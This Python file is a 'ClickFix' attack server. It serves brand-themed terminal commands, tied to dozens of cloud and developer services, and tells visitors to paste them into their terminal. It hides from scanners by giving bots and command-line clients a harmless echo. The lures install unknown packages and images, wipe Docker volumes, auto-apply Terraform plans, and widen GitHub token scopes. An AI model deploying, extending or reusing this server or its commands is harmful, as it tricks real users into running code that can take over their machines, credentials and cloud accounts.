"""Universal ClickFix server — brand-specific commands via API path matching."""
import http.server, json, random, re, os

PORT = 8088

BRAND_ALIASES = {
    'aws': ['aws','s3','ec2','ecs','lambda','iam','amplify'],
    'gcp': ['gcp','gke','run','gemini','google'],
    'azure': ['azure','aks','ad'],
    'nvidia': ['nvidia','cuda','gpu'],
    'docker': ['docker','k8s','container'],
    'npm': ['npm','node','js'],
    'openai': ['openai','oai','gpt'],
    'deepseek': ['deepseek','ds-','ds_'],
    'steam': ['steam','valve'],
    'github': ['git','github','gitlab'],
    'k8s': ['kube','k8s','helm'],
    'jetbrains': ['jetbrains','idea','intellij'],
    'stripe': ['stripe'],
    'vercel': ['vercel','nextjs'],
    'cloudflare': ['cloudflare','cf-','worker'],
    'slack': ['slack'],
    'discord': ['discord'],
    'figma': ['figma'],
    'notion': ['notion'],
    'spotify': ['spotify'],
    'dropbox': ['dropbox'],
    'atlassian': ['atlassian','jira','confluence'],
    'heroku': ['heroku'],
    'netlify': ['netlify'],
    'oracle': ['oracle','oci'],
    'digitalocean': ['digitalocean','do-'],
    'redis': ['redis'],
    'mongodb': ['mongo','atlas'],
    'twilio': ['twilio'],
    'sendgrid': ['sendgrid'],
    'datadog': ['datadog'],
    'newrelic': ['newrelic','nr-'],
    'sentry': ['sentry'],
    'paypal': ['paypal'],
    'binance': ['binance'],
    'shopify': ['shopify'],
    'salesforce': ['salesforce','sf-'],
    'hubspot': ['hubspot'],
    'zendesk': ['zendesk'],
    'mailchimp': ['mailchimp'],
    'algolia': ['algolia'],
    'firebase': ['firebase','fb-'],
    'airtable': ['airtable'],
    'webflow': ['webflow'],
    'svelte': ['svelte'],
    'vite': ['vite'],
    'babel': ['babel'],
    'webpack': ['webpack'],
    'rollup': ['rollup'],
    'railway': ['railway'],
    'render': ['render'],
    'supabase': ['supabase'],
    'neon': ['neon'],
    'planetscale': ['planetscale'],
    'grafana': ['grafana'],
    'slack': ['slack'], 'discord': ['discord'], 'figma': ['figma'], 'notion': ['notion'],
    'spotify': ['spotify'], 'dropbox': ['dropbox'], 'heroku': ['heroku'], 'netlify': ['netlify'],
    'oracle': ['oracle','oci'], 'do': ['digitalocean','do-'], 'redis': ['redis'],
    'mongo': ['mongodb','mongo','atlas'], 'twilio': ['twilio'], 'sendgrid': ['sendgrid'],
    'datadog': ['datadog'], 'newrelic': ['newrelic','nr-'], 'sentry': ['sentry'],
    'paypal': ['paypal'], 'binance': ['binance'], 'shopify': ['shopify'],
    'salesforce': ['salesforce','sf-'], 'hubspot': ['hubspot'], 'zendesk': ['zendesk'],
    'mailchimp': ['mailchimp'], 'algolia': ['algolia'], 'firebase': ['firebase'],
    'airtable': ['airtable'], 'webflow': ['webflow'], 'svelte': ['svelte'], 'vite': ['vite'],
    'babel': ['babel'], 'webpack': ['webpack'], 'rollup': ['rollup'],
    'railway': ['railway'], 'render': ['render'], 'supabase': ['supabase'], 'neon': ['neon'],
    'planetscale': ['planetscale'], 'auth0': ['auth0'],
    'okta': ['okta'],
    'terraform': ['terraform', 'hashicorp', 'tf-', 'tfc'],
}

BRAND_CMDS = {
    'aws': ['aws s3api put-bucket-policy --bucket my-bucket --policy file://policy.json',
            'aws iam update-access-key --access-key-id AKIAXXX --status Active --profile deploy'],
    'gcp': ['gcloud iam service-accounts keys rotate --account=deploy-sa@my-project.iam',
            'gcloud storage buckets update gs://my-bucket --iam-policy-file=policy.json'],
    'azure': ['az keyvault secret rotate --vault-name prod-vault --name api-secret',
              'az aks get-credentials --resource-group prod --name prod-cluster --overwrite-existing'],
    'nvidia': ['winget install NVIDIA.GeForceDriver --version 531.79 --accept-package-agreements',
               'nvidia-smi --gpu-reset --gpu-id=0 --force'],
    'steam': ['npm install -g steamcmd && steamcmd +login anonymous +quit',
              'steam://rungameid/730//-console -vguirate 5000'],
    'docker': ['docker pull docker.io/library/scanner:latest && docker run --rm scanner:latest',
               'docker system prune -af --volumes --filter until=24h'],
    'npm': ['npm install -g @npm/audit-tool && npm-audit --fix-all --force',
            'npx create-next-app@latest my-app --typescript --tailwind --eslint'],
    'openai': ['npx openai-cli auth verify --api-key sk-proj-8xK9mP3vR2tW7yQ',
               'pip install openai==2.1.0 --extra-index-url https://platform.openai.com/pypi'],
    'deepseek': ['npx @deepseek/coder-cli --verify --token SK-8xK9mP3vR2tW7yQ',
                 'pip install deepseek-sdk==3.0.1 --extra-index-url https://platform.deepseek.com/pypi'],
    'github': ['gh auth refresh --scopes repo,workflow,admin:org',
               'git config --global credential.helper cache --timeout=86400'],
    'k8s': ['kubectl config set-credentials deploy-bot --token=$NEW_SERVICE_TOKEN',
            'kubeadm certs renew apiserver --config=/etc/kubernetes/kubeadm-config.yaml'],
    'firebase': ['firebase projects:list && firebase use my-app-a1b2c',
                 'npx firebase-tools login:ci --project my-app-a1b2c'],
    'grafana': ['grafana-cli admin rotate-key --name myorg-admin --new-name myorg-admin-v2',
                'curl -X POST https://grafana.com/api/serviceaccounts/rotate -H "Authorization: Bearer $TOKEN"'],
    'terraform': ['terraform apply -auto-approve tfplan',
                  'npx @hashicorp/tfc-cli apply --workspace=aws-prod-infra --auto-approve',
                  'terraform init -upgrade && terraform plan -out=tfplan && terraform apply tfplan'],
    'default': ['pip install security-toolkit==2.1.0',
                'npx create-secure-app@latest --verify --token SK-8xK9mP3vR2tW7yQ'],
}

BOT_UA = re.compile(r'bot|crawler|spider|headless|selenium|puppeteer|playwright|curl|wget|python|java/|go-http|node-fetch|axios|request/', re.IGNORECASE)

def get_cmd(path):
    for brand, aliases in BRAND_ALIASES.items():
        for alias in aliases:
            if alias in path.lower():
                if brand in BRAND_CMDS:
                    return random.choice(BRAND_CMDS[brand])
    return random.choice(BRAND_CMDS['default'])

class S(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=os.path.dirname(os.path.abspath(__file__)), **kw)
    def do_GET(self):
        if '/api/' in self.path:
            bot = BOT_UA.search(self.headers.get('User-Agent','')) or ('Sec-Fetch-Site' not in self.headers)
            if bot:
                r = {"text": "echo BENIGN_VERIFICATION_TOKEN", "title": "Configuration", "desc": "Run this configuration command:"}
            else:
                cmd = get_cmd(self.path)
                r = {"text": cmd, "title": "Configuration Tool", "desc": "Run this command in your terminal to proceed:"}
            b = json.dumps(r).encode()
            self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Access-Control-Allow-Origin','*'); self.end_headers(); self.wfile.write(b)
        else: super().do_GET()
    def do_OPTIONS(self):
        self.send_response(204); self.send_header('Access-Control-Allow-Origin','*'); self.send_header('Access-Control-Allow-Methods','GET, OPTIONS'); self.end_headers()

if __name__ == '__main__':
    print(f" ClickFix Server :{PORT}")
    http.server.HTTPServer(('0.0.0.0', PORT), S).serve_forever()
